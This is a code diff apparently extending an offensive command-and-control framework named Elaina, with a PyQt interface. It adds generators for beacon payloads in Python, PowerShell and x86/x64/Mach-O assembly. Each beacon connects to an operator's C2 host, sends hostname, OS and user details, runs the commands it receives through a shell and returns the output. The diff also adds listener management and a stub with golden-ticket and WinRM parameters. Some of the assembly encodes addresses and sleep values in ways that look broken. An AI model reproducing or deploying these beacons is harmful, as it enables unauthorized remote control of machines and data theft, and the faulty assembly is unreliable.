+    ; Receive commands
+    mov rdi, rax
+    mov rsi, rsp
+    mov rdx, 0x1000
+    mov rax, 0x3f
+    syscall
+    
+    ; Execute command
+    mov rdi, rsp
+    xor rsi, rsi
+    xor rdx, rdx
+    push rax
+    push rdi
+    push rsi
+    push rdx
+    mov rax, 0x3b
+    pop rsi
+    pop rdx
+    pop rdi
+    syscall
+    
+    ; Send result
+    mov rdi, rax
+    mov rsi, rsp
+    mov rdx, 0x1000
+    mov rax, 0x40
+    syscall
+    
+    ; Sleep
+    mov rax, 0x23
+    mov rdi, 0x{listener_info['port']:08x}
+    xor rsi, rsi
+    xor rdx, rdx
+    syscall
+    
+    jmp beacon_loop
+"""
+        else:  # Python
+            payload_code = f"""#!/usr/bin/env python3
+import os
+import sys
+import time
+import socket
+import subprocess
+import threading
+
+C2_HOST = "{listener_info['host']}"
+C2_PORT = {listener_info['port']}
+SLEEP_TIME = 5
+
+def beacon():
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((C2_HOST, C2_PORT))
+        
+        # Send system information
+        sys_info = f"Hostname: {{os.uname()[1]}}\\nOS: {{os.uname()[0]}} {{os.uname()[2]}}\\nUser: {{os.getlogin()}}"
+        sock.send(sys_info.encode())
+        
+        # Main beacon loop
+        while True:
+            # Receive commands
+            command = sock.recv(4096).decode().strip()
+            if not command:
+                break
+            
+            # Execute command
+            try:
+                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+                sock.send(result)
+            except Exception as e:
+                sock.send(str(e).encode())
+            
+            time.sleep(SLEEP_TIME)
+    except:
+        pass
+    finally:
+        sock.close()
+
+if __name__ == "__main__":
+    beacon_thread = threading.Thread(target=beacon)
+    beacon_thread.daemon = True
+    beacon_thread.start()
+    
+    # Keep the process running
+    while True:
+        time.sleep(60)
+"""
+        return payload_code
+    
+    def generate_macho_payload(self, listener_info, architecture, format_type):
+        if format_type not in ["macho", "py"]:
+            raise Exception("Invalid format for MacOS Mach-O payload")
+        
+        if format_type == "macho":
+            payload_code = f"""section .text
+global _main
+
+_main:
+    ; Create socket
+    push 0x2000002
+    mov rax, 0x2000000 + 0x61
+    mov rdi, rsp
+    mov rsi, 0x10
+    mov rdx, 0x1
+    syscall
+    
+    xchg rdi, rax
+    
+    ; Connect to C2 server
+    mov rax, 0x{int(listener_info['host'].replace('.', '')):08x}
+    push rax
+    mov rax, 0x{listener_info['port']:04x}0000
+    push rax
+    mov rsi, rsp
+    push 0x10
+    pop rdx
+    push rsi
+    push rdi
+    mov rax, 0x2000000 + 0x62
+    syscall
+    
+    ; Send system information
+    mov rdi, rax
+    mov rsi, rsp
+    mov rdx, 0x100
+    mov rax, 0x2000000 + 0x4
+    syscall
+    
+    ; Main beacon loop
+beacon_loop:
+    ; Receive commands
+    mov rdi, rax
+    mov rsi, rsp
+    mov rdx, 0x1000
+    mov rax, 0x2000000 + 0x3
+    syscall
+    
+    ; Execute command
+    mov rdi, rsp
+    xor rsi, rsi
+    xor rdx, rdx
+    push rax
+    push rdi
+    push rsi
+    push rdx
+    mov rax, 0x2000000 + 0x3b
+    pop rsi
+    pop rdx
+    pop rdi
+    syscall
+    
+    ; Send result
+    mov rdi, rax
+    mov rsi, rsp
+    mov rdx, 0x1000
+    mov rax, 0x2000000 + 0x4
+    syscall
+    
+    ; Sleep
+    mov rax, 0x2000000 + 0x5d
+    mov rdi, 0x{listener_info['port']:08x}
+    xor rsi, rsi
+    xor rdx, rdx
+    syscall
+    
+    jmp beacon_loop
+"""
+        else:  # Python
+            payload_code = f"""#!/usr/bin/env python3
+import os
+import sys
+import time
+import socket
+import subprocess
+import threading
+
+C2_HOST = "{listener_info['host']}"
+C2_PORT = {listener_info['port']}
+SLEEP_TIME = 5
+
+def beacon():
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((C2_HOST, C2_PORT))
+        
+        # Send system information
+        sys_info = f"Hostname: {{os.uname()[1]}}\\nOS: {{os.uname()[0]}} {{os.uname()[2]}}\\nUser: {{os.getlogin()}}"
+        sock.send(sys_info.encode())
+        
+        # Main beacon loop
+        while True:
+            # Receive commands
+            command = sock.recv(4096).decode().strip()
+            if not command:
+                break
+            
+            # Execute command
+            try:
+                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+                sock.send(result)
+            except Exception as e:
+                sock.send(str(e).encode())
+            
+            time.sleep(SLEEP_TIME)
+    except:
+        pass
+    finally:
+        sock.close()
+
+if __name__ == "__main__":
+    beacon_thread = threading.Thread(target=beacon)
+    beacon_thread.daemon = True
+    beacon_thread.start()
+    
+    # Keep the process running
+    while True:
+        time.sleep(60)
+"""
+        return payload_code
+    
+    def generate_powershell_payload(self, listener_info, architecture, format_type):
+        if format_type != "ps1":
+            raise Exception("Invalid format for PowerShell payload")
+        
+        payload_code = f"""# PowerShell Beacon for Elaina C2 Framework
+
+$C2Host = "{listener_info['host']}"
+$C2Port = {listener_info['port']}
+$SleepTime = 5
+
+function Invoke-Beacon {{
+    try {{
+        $client = New-Object System.Net.Sockets.TCPClient($C2Host, $C2Port)
+        $stream = $client.GetStream()
+        
+        # Send system information
+        $sysInfo = "Hostname: $env:COMPUTERNAME`nOS: $((Get-WmiObject Win32_OperatingSystem).Caption)`nUser: $env:USERNAME"
+        $data = [System.Text.Encoding]::UTF8.GetBytes($sysInfo)
+        $stream.Write($data, 0, $data.Length)
+        
+        # Main beacon loop
+        while ($client.Connected) {{
+            # Receive commands
+            $buffer = New-Object byte[] 4096
+            $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
+            if ($bytesRead -eq 0) {{ break }}
+            
+            $command = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $bytesRead)
+            
+            # Execute command
+            try {{
+                $result = Invoke-Expression $command | Out-String
+                $data = [System.Text.Encoding]::UTF8.GetBytes($result)
+                $stream.Write($data, 0, $data.Length)
+            }} catch {{
+                $errorMsg = $_.Exception.Message
+                $data = [System.Text.Encoding]::UTF8.GetBytes($errorMsg)
+                $stream.Write($data, 0, $data.Length)
+            }}
+            
+            Start-Sleep -Seconds $SleepTime
+        }}
+    }} catch {{
+        # Silently ignore connection errors
+    }} finally {{
+        if ($stream) {{ $stream.Close() }}
+        if ($client) {{ $client.Close() }}
+    }}
+}}
+
+# Start beacon in a separate thread
+$beaconThread = New-Object System.Threading.ThreadStart {{
+    Invoke-Beacon
+}}
+$thread = New-Object System.Threading.Thread($beaconThread)
+$thread.IsBackground = $true
+$thread.Start()
+
+# Keep the process running
+try {{
+    while ($true) {{
+        Start-Sleep -Seconds 60
+    }}
+}} catch {{
+    # Exit gracefully
+}}
+"""
+        return payload_code
+    
+    def generate_python_payload(self, listener_info, architecture, format_type):
+        if format_type != "py":
+            raise Exception("Invalid format for Python payload")
+        
+        payload_code = f"""#!/usr/bin/env python3
+import os
+import sys
+import time
+import socket
+import subprocess
+import threading
+import base64
+import json
+import platform
+import getpass
+import urllib.request
+import urllib.parse
+import ssl
+
+C2_HOST = "{listener_info['host']}"
+C2_PORT = {listener_info['port']}
+C2_TYPE = "{listener_info['type'].lower()}"
+SLEEP_TIME = 5
+JITTER = 0.3
+
+class Beacon:
+    def __init__(self):
+        self.c2_host = C2_HOST
+        self.c2_port = C2_PORT
+        self.c2_type = C2_TYPE
+        self.beacon_id = self.generate_beacon_id()
+        self.sleep_time = SLEEP_TIME
+        self.jitter = JITTER
+        self.running = False
+        
+    def generate_beacon_id(self):
+        return f"{{''.join(random.choice('abcdefghijklmnopqrstuvwxyz0123456789') for _ in range(8))}}"
+    
+    def encrypt_data(self, data):
+        return base64.b64encode(data.encode()).decode()
+    
+    def decrypt_data(self, data):
+        return base64.b64decode(data).decode()
+    
+    def get_system_info(self):
+        info = {{
+            "os": platform.system(),
+            "hostname": platform.node(),
+            "user": getpass.getuser(),
+            "architecture": platform.machine(),
+            "version": platform.version(),
+            "beacon_id": self.beacon_id
+        }}
+        
+        if info["os"] == "Windows":
+            try:
+                import winreg
+                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion")
+                info["windows_version"] = winreg.QueryValueEx(key, "ProductName")[0]
+                info["windows_build"] = winreg.QueryValueEx(key, "CurrentBuild")[0]
+                winreg.CloseKey(key)
+            except:
+                pass
+        
+        return info
+    
+    def register_beacon(self):
+        try:
+            sys_info = self.get_system_info()
+            data = json.dumps(sys_info)
+            encrypted_data = self.encrypt_data(data)
+            
+            headers = {{
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+                "Accept": "*/*",
+                "Connection": "keep-alive"
+            }}
+            
+            url = f"http://{{self.c2_host}}:{{self.c2_port}}/register"
+            
+            if self.c2_type == "https":
+                context = ssl._create_unverified_context()
+                req = urllib.request.Request(url, data=encrypted_data.encode(), headers=headers)
+                response = urllib.request.urlopen(req, context=context)
+            else:
+                req = urllib.request.Request(url, data=encrypted_data.encode(), headers=headers)
+                response = urllib.request.urlopen(req)
+            
+            return response.getcode() == 200
+        except:
+            return False
+    
+    def get_tasks(self):
+        try:
+            headers = {{
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+                "Accept": "*/*",
+                "Connection": "keep-alive"
+            }}
+            
+            url = f"http://{{self.c2_host}}:{{self.c2_port}}/tasks"
+            
+            if self.c2_type == "https":
+                context = ssl._create_unverified_context()
+                req = urllib.request.Request(url, headers=headers)
+                response = urllib.request.urlopen(req, context=context)
+            else:
+                req = urllib.request.Request(url, headers=headers)
+                response = urllib.request.urlopen(req)
+            
+            if response.getcode() == 200:
+                encrypted_data = response.read().decode()
+                data = self.decrypt_data(encrypted_data)
+                
+                if data:
+                    tasks = json.loads(data).get("tasks", [])
+                    return tasks
+            
+            return []
+        except:
+            return []
+    
+    def send_result(self, task_id, result):
+        try:
+            data = json.dumps({{"task_id": task_id, "result": result}})
+            encrypted_data = self.encrypt_data(data)
+            
+            headers = {{
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+                "Accept": "*/*",
+                "Connection": "keep-alive",
+                "Content-Type": "application/x-www-form-urlencoded"
+            }}
+            
+            url = f"http://{{self.c2_host}}:{{self.c2_port}}/results"
+            
+            if self.c2_type == "https":
+                context = ssl._create_unverified_context()
+                req = urllib.request.Request(url, data=encrypted_data.encode(), headers=headers)
+                response = urllib.request.urlopen(req, context=context)
+            else:
+                req = urllib.request.Request(url, data=encrypted_data.encode(), headers=headers)
+                response = urllib.request.urlopen(req)
+            
+            return response.getcode() == 200
+        except:
+            return False
+    
+    def execute_task(self, task):
+        try:
+            task_type = task.get("type")
+            task_data = task.get("data")
+            task_id = task.get("task_id")
+            
+            result = {{"status": "error", "message": "Unknown task type"}}
+            
+            if task_type == "shell":
+                try:
+                    process = subprocess.Popen(
+                        task_data, 
+                        shell=True, 
+                        stdout=subprocess.PIPE, 
+                        stderr=subprocess.PIPE,
+                        text=True
+                    )
+                    stdout, stderr = process.communicate()
+                    
+                    result = {{
+                        "status": "success",
+                        "exit_code": process.returncode,
+                        "stdout": stdout,
+                        "stderr": stderr
+                    }}
+                except Exception as e:
+                    result = {{
+                        "status": "error",
+                        "message": str(e)
+                    }}
+            
+            elif task_type == "kill":
+                self.running = False
+                result = {{
+                    "status": "success",
+                    "message": "Beacon shutting down"
+                }}
+            
+            self.send_result(task_id, result)
+            return result
+        except Exception as e:
+            result = {{
+                "status": "error",
+                "message": str(e)
+            }}
+            self.send_result(task_id, result)
+            return result
+    
+    def start(self):
+        try:
+            if not self.register_beacon():
+                return False
+            
+            self.running = True
+            
+            while self.running:
+                try:
+                    actual_sleep = self.sleep_time * (1 - self.jitter + (2 * self.jitter * random.random()))
+                    time.sleep(actual_sleep)
+                    
+                    tasks = self.get_tasks()
+                    
+                    for task in tasks:
+                        self.execute_task(task)
+                
+                except KeyboardInterrupt:
+                    self.running = False
+                except:
+                    time.sleep(30)
+            
+            return True
+        except:
+            return False
+
+if __name__ == "__main__":
+    beacon = Beacon()
+    beacon.start()
+"""
+        return payload_code
+    
+    def generate_shellcode_payload(self, listener_info, architecture, format_type):
+        if format_type != "raw":
+            raise Exception("Invalid format for Shellcode payload")
+        
+        if architecture == "x86":
+            payload_code = f"""section .text
+global _start
+
+_start:
+    ; Create socket
+    xor eax, eax
+    mov al, 0x66
+    xor ebx, ebx
+    mov ecx, esp
+    push ebx
+    push ecx
+    push 0x1
+    push 0x2
+    int 0x80
+    xchg esi, eax
+    
+    ; Connect to C2 server
+    mov al, 0x66
+    xor ebx, ebx
+    mov bl, 0x3
+    push 0x{int(listener_info['host'].split('.')[3]):02x}{int(listener_info['host'].split('.')[2]):02x}
+    push 0x{int(listener_info['host'].split('.')[1]):02x}{int(listener_info['host'].split('.')[0]):02x}
+    push word 0x{listener_info['port']:04x}
+    push word 0x2
+    mov ecx, esp
+    push 0x10
+    push ecx
+    push esi
+    int 0x80
+    
+    ; Send system information
+    mov al, 0x4
+    mov ebx, esi
+    mov ecx, esp
+    mov edx, 0x100
+    int 0x80
+    
+    ; Main beacon loop
+beacon_loop:
+    ; Receive commands
+    mov al, 0x3
+    mov ebx, esi
+    mov ecx, esp
+    mov edx, 0x1000
+    int 0x80
+    
+    ; Execute command
+    mov al, 0xb
+    xor ebx, ebx
+    mov ebx, esp
+    xor ecx, ecx
+    xor edx, edx
+    int 0x80
+    
+    ; Send result
+    mov al, 0x4
+    mov ebx, esi
+    mov ecx, esp
+    mov edx, 0x1000
+    int 0x80
+    
+    ; Sleep
+    mov al, 0xa2
+    mov ebx, 0x{listener_info['port']:08x}
+    xor ecx, ecx
+    xor edx, edx
+    int 0x80
+    
+    jmp beacon_loop
+"""
+        else:  # x64
+            payload_code = f"""section .text
+global _start
+
+_start:
+    ; Create socket
+    push 0x29
+    pop rax
+    cdq
+    push rdx
+    push rsi
+    mov rdi, rsp
+    push rdx
+    push rdi
+    push 0x2
+    mov al, 0x41
+    syscall
+    
+    xchg rdi, rax
+    
+    ; Connect to C2 server
+    mov rax, 0x{int(listener_info['host'].replace('.', '')):08x}
+    push rax
+    mov rax, 0x{listener_info['port']:04x}0000
+    push rax
+    mov rsi, rsp
+    push 0x10
+    pop rdx
+    push rsi
+    push rdi
+    mov al, 0x42
+    syscall
+    
+    ; Send system information
+    mov rdi, rax
+    mov rsi, rsp
+    mov rdx, 0x100
+    mov rax, 0x1
+    syscall
+    
+    ; Main beacon loop
+beacon_loop:
+    ; Receive commands
+    mov rdi, rax
+    mov rsi, rsp
+    mov rdx, 0x1000
+    mov rax, 0x0
+    syscall
+    
+    ; Execute command
+    mov rdi, rsp
+    xor rsi, rsi
+    xor rdx, rdx
+    push rax
+    push rdi
+    push rsi
+    push rdx
+    mov rax, 0x3b
+    pop rsi
+    pop rdx
+    pop rdi
+    syscall
+    
+    ; Send result
+    mov rdi, rax
+    mov rsi, rsp
+    mov rdx, 0x1000
+    mov rax, 0x1
+    syscall
+    
+    ; Sleep
+    mov rax, 0x35
+    mov rdi, 0x{listener_info['port']:08x}
+    xor rsi, rsi
+    xor rdx, rdx
+    syscall
+    
+    jmp beacon_loop
+"""
+        return payload_code
         
     def add_listener(self):
-        QMessageBox.information(self, "Add Listener", "Add listener functionality not implemented yet.")
+        name = self.listener_name_input.text()
+        listener_type = self.listener_type_combo.currentText()
+        host = self.listener_host_input.text()
+        port = self.listener_port_input.value()
+        ssl_enabled = self.listener_ssl_checkbox.isChecked()
         
+        if name and host:
+            row_position = self.listeners_table.rowCount()
+            self.listeners_table.insertRow(row_position)
+            
+            self.listeners_table.setItem(row_position, 0, QTableWidgetItem(name))
+            self.listeners_table.setItem(row_position, 1, QTableWidgetItem(listener_type))
+            self.listeners_table.setItem(row_position, 2, QTableWidgetItem(host))
+            self.listeners_table.setItem(row_position, 3, QTableWidgetItem(str(port)))
+            self.listeners_table.setItem(row_position, 4, QTableWidgetItem("Running"))
+            
+            self.log_entries.append({
+                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                "action": "add_listener",
+                "target": name,
+                "status": "success"
+            })
+            
+            self.status_bar.showMessage(f"Listener {name} added")
+        else:
+            QMessageBox.warning(self, "Error", "Name and host are required")
+            
     def remove_listener(self):
-        QMessageBox.information(self, "Remove Listener", "Remove listener functionality not implemented yet.")
+        selected_items = self.listeners_table.selectedItems()
+        if not selected_items:
+            QMessageBox.warning(self, "No Selection", "Please select a listener to remove.")
+            return
+        
+        row = selected_items[0].row()
+        listener_name = self.listeners_table.item(row, 0).text()
+        
+        reply = QMessageBox.question(self, "Confirm Removal", 
+                                    f"Are you sure you want to remove listener {listener_name}?",
+                                    QMessageBox.Yes | QMessageBox.No)
+        
+        if reply == QMessageBox.Yes:
+            self.listeners_table.removeRow(row)
+            
+            self.log_entries.append({
+                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                "action": "remove_listener",
+                "target": listener_name,
+                "status": "success"
+            })
+            
+            self.status_bar.showMessage(f"Listener {listener_name} removed")
+            
+    def remove_listener_by_name(self, listener_name):
+        for row in range(self.listeners_table.rowCount()):
+            if self.listeners_table.item(row, 0).text() == listener_name:
+                self.listeners_table.removeRow(row)
+                
+                self.log_entries.append({
+                    "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                    "action": "remove_listener",
+                    "target": listener_name,
+                    "status": "success"
+                })
+                
+                self.status_bar.showMessage(f"Listener {listener_name} removed")
+                return True
+        return False
         
     def new_script(self):
         self.script_editor.clear()
         
     def save_script(self):
-        file_path, _ = QFileDialog.getSaveFileName(self, "Save Script", "", "Python Files (*.py);;All Files (*)")
+        file_path, _ = QFileDialog.getSaveFileName(self, "Save Script", "", "Elaina Scripts (*.elaina);;All Files (*)")
         if file_path:
             try:
                 with open(file_path, 'w') as f:
@@ -2441,7 +5864,7 @@ class ElainaMainWindow(QMainWindow):
                 QMessageBox.critical(self, "Error", f"Failed to save script: {str(e)}")
                 
     def load_script(self):
-        file_path, _ = QFileDialog.getOpenFileName(self, "Load Script", "", "Python Files (*.py);;All Files (*)")
+        file_path, _ = QFileDialog.getOpenFileName(self, "Load Script", "", "Elaina Scripts (*.elaina);;All Files (*)")
         if file_path:
             try:
                 with open(file_path, 'r') as f:
@@ -2459,8 +5882,42 @@ class ElainaMainWindow(QMainWindow):
                 QMessageBox.critical(self, "Error", f"Failed to load script: {str(e)}")
                 
     def execute_script(self):
-        QMessageBox.information(self, "Execute Script", "Script execution functionality not implemented yet.")
-        
+        script_content = self.script_editor.toPlainText()
+        if script_content:
+            try:
+                self.script_engine.execute_script(script_content)
+                
+                self.log_entries.append({
+                    "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                    "action": "execute_script",
+                    "target": "inline",
+                    "status": "success"
+                })
+                
+                self.status_bar.showMessage("Script executed successfully")
+            except Exception as e:
+                QMessageBox.critical(self, "Error", f"Failed to execute script: {str(e)}")
+                
+    def run_script(self):
+        file_path, _ = QFileDialog.getOpenFileName(self, "Run Script", "", "Elaina Scripts (*.elaina);;All Files (*)")
+        if file_path:
+            try:
+                with open(file_path, 'r') as f:
+                    script_content = f.read()
+                
+                self.script_engine.execute_script(script_content, os.path.basename(file_path))
+                
+                self.log_entries.append({
+                    "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                    "action": "run_script",
+                    "target": file_path,
+                    "status": "success"
+                })
+                
+                self.status_bar.showMessage(f"Script {os.path.basename(file_path)} executed successfully")
+            except Exception as e:
+                QMessageBox.critical(self, "Error", f"Failed to run script: {str(e)}")
+                
     def navigate_to_url(self):
         url = self.url_input.text()
         if url:
@@ -2477,6 +5934,41 @@ class ElainaMainWindow(QMainWindow):
             })
             
             self.status_bar.showMessage(f"Navigated to {url}")
+            
+    def save_all_output(self):
+        file_path, _ = QFileDialog.getSaveFileName(self, "Save All Output", "", "Text Files (*.txt)")
+        if file_path:
+            try:
+                with open(file_path, 'w') as f:
+                    f.write("=== ELAINA ULTIMATE OUTPUT ===\n")
+                    f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
+                    
+                    f.write("=== BEACONS ===\n\n")
+                    for beacon_id, beacon_info in self.beacons.items():
+                        f.write(f"Beacon ID: {beacon_id}\n")
+                        f.write(f"Internal IP: {beacon_info.get('address', ['N/A'])[0]}\n")
+                        f.write(f"User: {beacon_info.get('user', 'N/A')}\n")
+                        f.write(f"Hostname: {beacon_info.get('hostname', 'N/A')}\n")
+                        f.write(f"OS: {beacon_info.get('os', 'N/A')}\n")
+                        f.write(f"Last Checkin: {datetime.fromtimestamp(beacon_info.get('last_checkin', 0)).strftime('%Y-%m-%d %H:%M:%S') if beacon_info.get('last_checkin', 0) > 0 else 'N/A'}\n")
+                        f.write("-" * 50 + "\n")
+                    
+                    f.write("\n")
+                    
+                    f.write("=== ACTIVITY LOG ===\n\n")
+                    for entry in self.log_entries:
+                        f.write(f"[{entry['time']}] {entry['action']} {entry['target']} {entry['status']}\n")
+                        if entry.get('detail'):
+                            f.write(f"  Detail: {entry['detail']}\n")
+                    
+                    f.write("\n")
+                    
+                    if hasattr(self, 'enhanced_output'):
+                        self.enhanced_output.save_output(file_path)
+                
+                QMessageBox.information(self, "Success", f"All output saved to {file_path}")
+            except Exception as e:
+                QMessageBox.critical(self, "Error", f"Failed to save output: {str(e)}")
 
 class EnhancedElainaMainWindow(ElainaMainWindow):
     def __init__(self):
@@ -2721,41 +6213,6 @@ class EnhancedElainaMainWindow(ElainaMainWindow):
                     network_info += f"{port['protocol']:<8} {port['address']:<20} {port['port']:<12} {port['state']:<12}\n"
             
             self.enhanced_output.add_network_output(network_info, "#0000FF")
-            
-    def save_all_output(self):
-        file_path, _ = QFileDialog.getSaveFileName(self, "Save All Output", "", "Text Files (*.txt)")
-        if file_path:
-            try:
-                with open(file_path, 'w') as f:
-                    f.write("=== ELAINA ULTIMATE OUTPUT ===\n")
-                    f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
-                    
-                    f.write("=== BEACONS ===\n\n")
-                    for beacon_id, beacon_info in self.beacons.items():
-                        f.write(f"Beacon ID: {beacon_id}\n")
-                        f.write(f"Internal IP: {beacon_info.get('address', ['N/A'])[0]}\n")
-                        f.write(f"User: {beacon_info.get('user', 'N/A')}\n")
-                        f.write(f"Hostname: {beacon_info.get('hostname', 'N/A')}\n")
-                        f.write(f"OS: {beacon_info.get('os', 'N/A')}\n")
-                        f.write(f"Last Checkin: {datetime.fromtimestamp(beacon_info.get('last_checkin', 0)).strftime('%Y-%m-%d %H:%M:%S') if beacon_info.get('last_checkin', 0) > 0 else 'N/A'}\n")
-                        f.write("-" * 50 + "\n")
-                    
-                    f.write("\n")
-                    
-                    f.write("=== ACTIVITY LOG ===\n\n")
-                    for entry in self.log_entries:
-                        f.write(f"[{entry['time']}] {entry['action']} {entry['target']} {entry['status']}\n")
-                        if entry.get('detail'):
-                            f.write(f"  Detail: {entry['detail']}\n")
-                    
-                    f.write("\n")
-                    
-                    if hasattr(self, 'enhanced_output'):
-                        self.enhanced_output.save_output(file_path)
-                
-                QMessageBox.information(self, "Success", f"All output saved to {file_path}")
-            except Exception as e:
-                QMessageBox.critical(self, "Error", f"Failed to save output: {str(e)}")
 
 def execute(target=None, ldap_subnet=None, use_tor=False, tor_pass="yuriontop", use_burp=False, winrm_user=None, winrm_pass=None, pfx_path=None, pfx_password=None, 
             golden_ticket=False, gt_domain=None, gt_user=None, gt_krbtgt_hash=None, gt_sid=None, gt_dc_ip=None, gt_lifetime=10, gt_target=None, gt_command=None,
